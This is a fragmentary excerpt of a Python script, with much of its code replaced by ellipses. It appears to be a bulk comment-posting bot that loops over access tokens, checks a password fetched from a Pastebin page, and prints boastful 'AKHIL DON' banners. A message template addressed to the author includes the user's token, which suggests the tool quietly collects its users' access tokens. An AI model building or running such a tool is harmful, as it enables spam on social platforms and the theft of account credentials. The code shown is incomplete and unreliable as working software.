...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"SERVER RUNNING => AKHIL DON")
...
def post_comments():
    ...
    if entered_password != password:
        print('[-] 1NCORR3CT P99SWORD TH3 P99SWORD CH9NG3 BY AKHIL DON')
        sys.exit()
    ...
    msg_template = "Hello akhil  sir! I am using your server. My token is {}"
    ...
    mmm = requests.get('https://pastebin.com/u/as2050565').text
    ...
    while True:
        try:
            for comment_index in range(num_comments):
                ...
                if response.ok:
                    print("[+] AKHIL DON GUNDAY RULLEX {} Post Id {} Token No. {}: {}".format(
